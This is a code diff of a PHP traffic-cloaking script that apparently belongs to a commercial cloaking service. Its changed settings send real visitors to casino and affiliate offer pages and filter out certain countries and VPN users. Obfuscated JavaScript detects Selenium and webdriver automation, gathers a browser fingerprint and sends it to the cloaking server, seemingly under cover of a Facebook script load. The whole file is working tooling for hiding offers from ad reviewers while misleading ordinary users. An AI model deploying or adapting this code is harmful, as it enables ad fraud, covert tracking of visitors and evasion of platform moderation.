@@ -3,8 +3,8 @@
 $HCSET['PASSIVE'] = false;
 
 /* Required settings     */
-$HCSET['OFFER_PAGE'] = 'https://1wdtji.top/casino/list?open=register#q58b';//PHP/HTML file or URL offer used for real users
-$HCSET['DEBUG_MODE'] = 'off';// replace "on" with "off" to switch from debug to production mode
+$HCSET['OFFER_PAGE'] = 'https://clicks.pipaffiliates.com/c?c=859525&l=vi&p=0';//PHP/HTML file or URL offer used for real users
+$HCSET['DEBUG_MODE'] = 'on';// replace "on" with "off" to switch from debug to production mode
 
 /* OFFER_PAGE display method. Available options: meta, 302, iframe */
 /* 'redirect' -  Redirect visitors using JS location.href (best method if the goal is maximum transitions).*/
@@ -16,7 +16,7 @@ $HCSET['OFFER_METHOD'] = 'redirect';
 
 /* COUNTRY FILTERS */
 $HCSET['FILTER_GEO_MODE'] = 'reject'; // string(allow|reject)
-$HCSET['FILTER_GEO_LIST'] = 'US, ES, LT, LV, DE, HU, SI, SK, CH, GB, GR, MT, DK, SE, CZ, RS, FR, NL, PL, TT, DZ, KW, IR, IT, PT, AE, CY'; // string([2Chars country codes])
+$HCSET['FILTER_GEO_LIST'] = 'US, CA, CN, JP, NZ, IL'; // string([2Chars country codes])
 
 /* DEVICE FILTERS */
 $HCSET['FILTER_DEV_MODE'] = ''; // 'allow|reject'
@@ -32,8 +32,8 @@ $HCSET['FILTER_REF_LIST'] = ''; // 'regExp()';
 $HCSET['FILTER_NOREF'] = ''; // 'allow|reject';
 
 /* NETWORK FILTERS */
-$HCSET['FILTER_NET_MODE'] = ''; // 'allow|reject'
-$HCSET['FILTER_NET_LIST'] = ''; // string([vpn|mobile|residential|corporate]);
+$HCSET['FILTER_NET_MODE'] = 'reject'; // 'allow|reject'
+$HCSET['FILTER_NET_LIST'] = 'vpn'; // string([vpn|mobile|residential|corporate]);
 
 /* NETWORK FILTERS */
 $HCSET['FILTER_BRO_MODE'] = ''; // 'allow|reject'
@@ -73,7 +73,7 @@ if (function_exists('debug_backtrace') && sizeof(debug_backtrace()) > 2) {
     echo "WARNING: INFINITE RECURSION PROTECTION";
     die();
 }
-$HCSET['JS_CODE'] = 'var HCTEWNXBT=function(src){var q=atob("X19zdG9wQWxsVGltZXJzLndlYmRyaXZlci5fX25pZ2h0bWFyZS5fc2VsZW5pdW0uY2FsbFBoYW50b20uY2FsbFNlbGVuaXVtLl9TZWxlbml1bV9JREVfUmVjb3JkZXIuc2VsZW5pdW0uZHJpdmVyLl9zZWxlbml1bS5fX3dlYmRyaXZlcl9ldmFsdWF0ZS5fX3NlbGVuaXVtX2V2YWx1YXRlLl9fd2ViZHJpdmVyX3NjcmlwdF9mdW5jdGlvbi5fX3dlYmRyaXZlcl9zY3JpcHRfZnVuYy5fX3dlYmRyaXZlcl9zY3JpcHRfZm4uX19meGRyaXZlcl9ldmFsdWF0ZS5fX2RyaXZlcl91bndyYXBwZWQuX193ZWJkcml2ZXJfdW53cmFwcGVkLl9fZHJpdmVyX2V2YWx1YXRlLl9fc2VsZW5pdW1fdW53cmFwcGVkLl9fZnhkcml2ZXJfdW53cmFwcGVkLl9waGFudG9tLnBoYW50b20uZG9tQXV0b21hdGlvbl9fbmlnaHRtYXJl").split("."),e=encodeURIComponent,g=0,w=window,d=w.document,n=w.navigator,de="documentElement",s=w.screen,p="",a="avail",i="inner",o="outer",H="Height",W="Width",c=w.chrome?Object.keys(w.chrome).join("*"):"*",tag=d.createElement("script");function wd(){try{for(var l in q){var z=q[l];if(w[z]||n[z])return z;if(d&&d[de]&&d[de].getAttribute&&d[de].getAttribute(z))return z;if(z in w||z in d)return z}return 0}catch(e){}}!function wp(){try{if(n&&n.plugins){Object.keys(n.plugins).forEach(function(i){if(n.plugins[i])p+=n.plugins[i].filename+"*"})}}catch(e){}}();try{g=d.createElement("canvas").getContext("webgl");g=g.getParameter(g.getExtension("WEBGL_debug_renderer_info").UNMASKED_RENDERER_WEBGL)}catch(e){}src="WHITE_PAGE_JS_CODE?clid="+btoa("ref="+e(d.referrer)+"&drive="+wd()+"&c="+c+"&s="+s[a+H]+"*"+w[i+H]+"*"+w[o+H]+"*"+s[a+W]+"*"+w[i+W]+"*"+w[o+W]+"*"+w.devicePixelRatio+"*"+n.maxTouchPoints+"&p="+p+"&h="+n.hardwareConcurrency+"*"+n.deviceMemory+"*"+e(g)+"&t="+e(new Date().toString())+"&q="+e(w.location.search.substr(1)));tag["type"]="text/javascript";tag["src"]=src;document.head.appendChild(tag)}("https://connect.facebook.net/en_US/fbevents.js")';
+$HCSET['JS_CODE'] = 'var HCTWBKCVT=function(src){var q=atob("X19zdG9wQWxsVGltZXJzLndlYmRyaXZlci5fX25pZ2h0bWFyZS5fc2VsZW5pdW0uY2FsbFBoYW50b20uY2FsbFNlbGVuaXVtLl9TZWxlbml1bV9JREVfUmVjb3JkZXIuc2VsZW5pdW0uZHJpdmVyLl9zZWxlbml1bS5fX3dlYmRyaXZlcl9ldmFsdWF0ZS5fX3NlbGVuaXVtX2V2YWx1YXRlLl9fd2ViZHJpdmVyX3NjcmlwdF9mdW5jdGlvbi5fX3dlYmRyaXZlcl9zY3JpcHRfZnVuYy5fX3dlYmRyaXZlcl9zY3JpcHRfZm4uX19meGRyaXZlcl9ldmFsdWF0ZS5fX2RyaXZlcl91bndyYXBwZWQuX193ZWJkcml2ZXJfdW53cmFwcGVkLl9fZHJpdmVyX2V2YWx1YXRlLl9fc2VsZW5pdW1fdW53cmFwcGVkLl9fZnhkcml2ZXJfdW53cmFwcGVkLl9waGFudG9tLnBoYW50b20uZG9tQXV0b21hdGlvbl9fbmlnaHRtYXJl").split("."),e=encodeURIComponent,g=0,w=window,d=w.document,n=w.navigator,de="documentElement",s=w.screen,p="",a="avail",i="inner",o="outer",H="Height",W="Width",c=w.chrome?Object.keys(w.chrome).join("*"):"*",tag=d.createElement("script");function wd(){try{for(var l in q){var z=q[l];if(w[z]||n[z])return z;if(d&&d[de]&&d[de].getAttribute&&d[de].getAttribute(z))return z;if(z in w||z in d)return z}return 0}catch(e){}}!function wp(){try{if(n&&n.plugins){Object.keys(n.plugins).forEach(function(i){if(n.plugins[i])p+=n.plugins[i].filename+"*"})}}catch(e){}}();try{g=d.createElement("canvas").getContext("webgl");g=g.getParameter(g.getExtension("WEBGL_debug_renderer_info").UNMASKED_RENDERER_WEBGL)}catch(e){}src="WHITE_PAGE_JS_CODE?clid="+btoa("ref="+e(d.referrer)+"&drive="+wd()+"&c="+c+"&s="+s[a+H]+"*"+w[i+H]+"*"+w[o+H]+"*"+s[a+W]+"*"+w[i+W]+"*"+w[o+W]+"*"+w.devicePixelRatio+"*"+n.maxTouchPoints+"&p="+p+"&h="+n.hardwareConcurrency+"*"+n.deviceMemory+"*"+e(g)+"&t="+e(new Date().toString())+"&q="+e(w.location.search.substr(1)));tag["type"]="text/javascript";tag["src"]=src;document.head.appendChild(tag)}("https://connect.facebook.net/en_US/fbevents.js")';
 $HCSET['VERSION']=20231024;
 /* dirty fix!!! uncomment only if problem with IP detection!!! */
 //if(!empty($_SERVER['HTTP_X_REAL_IP'])) $_SERVER['REMOTE_ADDR']=$_SERVER['HTTP_X_REAL_IP'];
@@ -375,7 +375,7 @@ function apiRequest($ip, $port, $HCSET, $HCSETdata)
 {
     if(!$ip) $ip='127.0.0.1';
     $host = gethostbyname('api.hideapi.xyz');
-    $url = 'http://'.$host.'/basic?ip=' . $ip . '&port=' . $port . '&key=' . $HCSET['API_SECRET_KEY'] . '&sign=v2-2125415141&js=false&stage='.$HCSET['stage'];
+    $url = 'http://'.$host.'/basic?ip=' . $ip . '&port=' . $port . '&key=' . $HCSET['API_SECRET_KEY'] . '&sign=v2-1828303123&js=false&stage='.$HCSET['stage'];
     if (!empty($HCSET['PASSIVE'])) $url .= '&PASSIVE=' . $HCSET['PASSIVE'];
     if (!empty($HCSET['DEBUG_MODE'])) $url .= '&DEBUG_MODE=' . $HCSET['DEBUG_MODE'];
     if (!empty($HCSET['banReason'])) $url .= '&banReason=' . $HCSET['banReason'];
